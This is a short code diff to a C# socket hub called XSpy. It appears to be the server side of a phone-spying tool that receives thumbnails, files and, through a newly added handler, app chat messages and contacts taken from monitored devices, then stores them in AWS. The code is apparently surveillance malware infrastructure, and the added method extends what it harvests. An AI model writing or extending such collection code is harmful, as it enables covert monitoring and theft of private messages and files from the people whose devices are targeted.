@@ -99,7 +99,6 @@ namespace XSpy.Socket
                 {
                     await client.SendAsync("0xTB", thumb.ImageId, thumb.Path);
                 }
-
             }
         }
 
@@ -112,7 +111,7 @@ namespace XSpy.Socket
             string[] split = fileRequest.Path.Split('/');
 
             var fileUrl = await _awsService.UploadFile(fileRequest.Buffer, fileRequest.ContentType,
-                Path.Combine("devices", device, fileRequest.Type, fileRequest.Path.Replace(".", null)),
+                Path.Combine($"/devices/{device}/{fileRequest.Type}/", fileRequest.Path.Replace(".", null)),
                 split.Last());
 
             await _deviceService.SaveImageThumb(GetDeviceId(), fileUrl, fileRequest.Path);
@@ -130,6 +129,17 @@ namespace XSpy.Socket
                 fileRequest.Name);
 
             await _deviceService.StoreFile(device, fileUrl, fileRequest);
+        }
+
+        //GET APP MSG
+        public async Task _0xAM(string request, string contact, string appName)
+        {
+            var fileRequest = JsonConvert.DeserializeObject<List<SaveAppMessageRequest>>(request);
+
+            var device = GetDeviceId();
+
+
+            await _deviceService.StoreAppMessages(device, fileRequest, appName, contact);
         }
 
 
